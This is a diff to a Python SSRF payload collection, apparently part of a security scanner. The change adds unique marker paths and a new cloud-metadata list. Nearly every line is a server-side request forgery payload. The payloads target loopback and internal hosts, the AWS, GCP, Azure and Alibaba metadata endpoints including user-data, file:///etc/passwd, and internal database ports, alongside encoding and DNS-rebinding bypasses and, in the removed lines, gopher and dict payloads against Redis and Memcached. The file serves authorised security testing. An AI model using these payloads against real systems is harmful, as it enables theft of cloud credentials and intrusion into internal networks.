@@ -1,5 +1,5 @@
 """
-SSRF payload collection
+SSRF payload collection with enhanced detection
 """
 
 class SSRFPayloads:
@@ -7,64 +7,54 @@ class SSRFPayloads:
     
     @staticmethod
     def get_basic_payloads():
-        """Get basic SSRF payloads"""
+        """Get basic SSRF payloads with unique markers"""
         return [
-            # Local network probing
-            'http://127.0.0.1/',
-            'http://localhost/',
-            'http://0.0.0.0/',
-            'http://[::1]/',
-            
-            # Internal network ranges
-            'http://192.168.1.1/',
-            'http://10.0.0.1/',
-            'http://172.16.0.1/',
-            
-            # Cloud metadata endpoints
-            'http://169.254.169.254/',
-            'http://169.254.169.254/latest/meta-data/',
-            'http://metadata.google.internal/',
-            
-            # File protocol
-            'file:///etc/passwd',
-            'file:///c:/windows/system32/drivers/etc/hosts',
-            
-            # Different ports
-            'http://127.0.0.1:22/',
-            'http://127.0.0.1:3306/',
-            'http://127.0.0.1:5432/',
-            'http://127.0.0.1:6379/',
+            'http://ssrf-test-internal.local/ssrf_marker_12345',
+            'https://ssrf-test-internal.local/ssrf_marker_12345',
+            'http://127.0.0.1:80/ssrf_marker_internal',
+            'http://localhost:80/ssrf_marker_localhost',
+            'http://0.0.0.0:80/ssrf_marker_zero',
+            'http://[::1]:80/ssrf_marker_ipv6',
+            'http://169.254.169.254/latest/meta-data/ssrf_marker_aws',
+            'http://metadata.google.internal/computeMetadata/v1/ssrf_marker_gcp',
+            'file:///etc/passwd#ssrf_marker_file',
+            'ftp://ssrf-test.local/ssrf_marker_ftp'
         ]
     
     @staticmethod
     def get_advanced_payloads():
-        """Get advanced SSRF payloads"""
+        """Get advanced SSRF payloads with bypass techniques"""
         return [
-            # URL encoding
-            'http://127.0.0.1/%2e%2e/',
-            'http://127.0.0.1/%252e%252e/',
-            
-            # IP encoding variations
-            'http://2130706433/',  # 127.0.0.1 in decimal
-            'http://0x7f000001/',  # 127.0.0.1 in hex
-            'http://017700000001/',  # 127.0.0.1 in octal
-            
-            # DNS rebinding
-            'http://localtest.me/',
-            'http://127.0.0.1.xip.io/',
-            
-            # Protocol confusion
-            'gopher://127.0.0.1:6379/_INFO',
-            'dict://127.0.0.1:11211/stat',
-            'ldap://127.0.0.1/',
-            
-            # Bypass attempts
-            'http://127.1/',
-            'http://0/',
-            'http://127.000.000.1/',
+            'http://ssrf-bypass.127.0.0.1.nip.io/ssrf_marker_bypass',
+            'http://127.1/ssrf_marker_short',
+            'http://2130706433/ssrf_marker_decimal',  # 127.0.0.1 in decimal
+            'http://0x7f000001/ssrf_marker_hex',      # 127.0.0.1 in hex
+            'http://localhost.ssrf-test.local/ssrf_marker_subdomain',
+            'http://127.0.0.1.ssrf-test.local/ssrf_marker_domain',
+            'http://ssrf-test@127.0.0.1/ssrf_marker_userinfo',
+            'http://127.0.0.1#ssrf-test.local/ssrf_marker_fragment',
+            'http://127.0.0.1:8080/ssrf_marker_port',
+            'http://127.0.0.1:22/ssrf_marker_ssh',
+            'http://127.0.0.1:3306/ssrf_marker_mysql',
+            'http://127.0.0.1:6379/ssrf_marker_redis'
+        ]
+    
+    @staticmethod
+    def get_cloud_metadata_payloads():
+        """Get cloud metadata SSRF payloads"""
+        return [
+            'http://169.254.169.254/latest/meta-data/instance-id/ssrf_marker_aws_instance',
+            'http://169.254.169.254/latest/user-data/ssrf_marker_aws_userdata',
+            'http://metadata.google.internal/computeMetadata/v1/instance/ssrf_marker_gcp_instance',
+            'http://169.254.169.254/metadata/instance/ssrf_marker_azure',
+            'http://100.100.100.200/latest/meta-data/ssrf_marker_alibaba'
         ]
     
     @staticmethod
     def get_all_payloads():
         """Get all SSRF payloads"""
-        return SSRFPayloads.get_basic_payloads() + SSRFPayloads.get_advanced_payloads()
+        payloads = []
+        payloads.extend(SSRFPayloads.get_basic_payloads())
+        payloads.extend(SSRFPayloads.get_advanced_payloads())
+        payloads.extend(SSRFPayloads.get_cloud_metadata_payloads())
+        return payloads
